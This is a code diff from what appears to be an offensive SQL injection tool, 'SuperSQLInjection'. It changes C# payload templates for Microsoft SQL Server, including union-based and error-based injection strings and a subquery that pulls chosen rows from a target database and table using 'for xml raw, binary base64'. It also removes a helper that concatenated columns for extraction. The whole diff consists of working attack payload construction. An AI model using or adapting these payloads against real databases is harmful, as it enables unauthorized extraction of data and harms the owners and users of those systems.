@@ -64,8 +64,6 @@ namespace SuperSQLInjection.payload
         //解决存在text，BINARY等多种数据类型时，存在空值，sql报错无法获取数据的问题
         public static String data_value = "(select top 1 {data} from (select top {index} * from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc for xml raw,binary base64)";
         
-
-
         //union获取值
         public static String union_value = " 1=2 union all select {data}";
 
@@ -217,8 +215,8 @@ namespace SuperSQLInjection.payload
         /// <param name="index">第几行数据，1开始</param>
         public static String getErrorDataValue(String dbname, String table,int index,List<String> columns)
         {
-            String data = data_value.Replace("{data}", concatAllColumnsByConcatStr(columns)).Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
-            String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{column}", concatAllColumnsByConcatStr(columns)).Replace("{index}", index.ToString());
+            String data = data_value.Replace("{data}", Comm.unionColumns(columns,",")).Replace("{orderby}", columns[0]);
+            String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index.ToString());
             return error_value.Replace("{data}", d);
         }
 
@@ -238,23 +236,7 @@ namespace SuperSQLInjection.payload
             sb.Remove(sb.Length - 1, 1);
             return sb.ToString();
         }
-        /// <summary>
-        /// 多字段拼接，带连接符
-        /// </summary>
-        /// <param name="columns"></param>
-        /// <returns></returns>
-        public static String concatAllColumnsByConcatStr(List<String> columns)
-        {
-            StringBuilder sb = new StringBuilder();
-            foreach (String column in columns)
-            {
-
-                sb.Append("cast(isnull(" + column + ",space(1)) as varchar(5000))+char(36)+char(36)+char(36)+");
-            }
-            sb.Remove(sb.Length - 28, 28);
-            return sb.ToString();
-        }
-
+       
         /// <summary>
         /// 获得bool方式值payload
         /// </summary>
